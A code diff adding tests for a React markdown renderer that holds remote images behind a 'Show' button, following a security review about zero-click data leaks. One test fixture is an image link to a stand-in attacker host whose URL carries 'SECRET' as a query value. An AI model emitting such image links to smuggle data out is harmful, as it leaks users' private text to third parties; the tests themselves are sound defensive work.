@@ -1,7 +1,7 @@
 // @vitest-environment jsdom
 import '@testing-library/jest-dom/vitest';
 import { describe, it, expect, afterEach } from 'vitest';
-import { render, screen, cleanup } from '@testing-library/react';
+import { render, screen, cleanup, fireEvent } from '@testing-library/react';
 import MarkdownContent from './MarkdownContent';
 
 afterEach(cleanup);
@@ -318,5 +318,30 @@ describe('MarkdownContent file paths', () => {
     const { container } = render(<MarkdownContent content={'open /home/destin/plan.md'} />);
     expect(paths(container)).toEqual([]);
     expect(container.textContent).toContain('/home/destin/plan.md');
+  });
+});
+
+// 2026-09-10 security review (Destin's "tap to show"): a picture from a WEBSITE
+// must not load until the person taps Show — its address can carry stolen text,
+// so an auto-loaded remote image is a zero-click exfiltration channel. A data:
+// image has no network fetch and renders immediately.
+describe('remote images wait for a tap; local images render inline', () => {
+  it('a website image renders a Show button, not an <img>, until tapped', () => {
+    render(<MarkdownContent content={'![cat](https://attacker.example/p.png?d=SECRET)'} />);
+    // No <img> has hit the DOM (no request left the machine).
+    expect(document.querySelector('img')).toBeNull();
+    const btn = screen.getByRole('button', { name: /image from attacker\.example/i });
+    expect(btn).toBeInTheDocument();
+    fireEvent.click(btn);
+    const img = document.querySelector('img');
+    expect(img).not.toBeNull();
+    expect(img!.getAttribute('src')).toBe('https://attacker.example/p.png?d=SECRET');
+  });
+
+  it('a data: image is never gated as a remote fetch (no Show button)', () => {
+    // react-markdown's default urlTransform already drops data: srcs, so the
+    // point is only that a data: image is NOT treated as a website fetch.
+    render(<MarkdownContent content={'![dot](data:image/png;base64,iVBORw0KGgo=)'} />);
+    expect(screen.queryByRole('button', { name: /image from/i })).toBeNull();
   });
 });
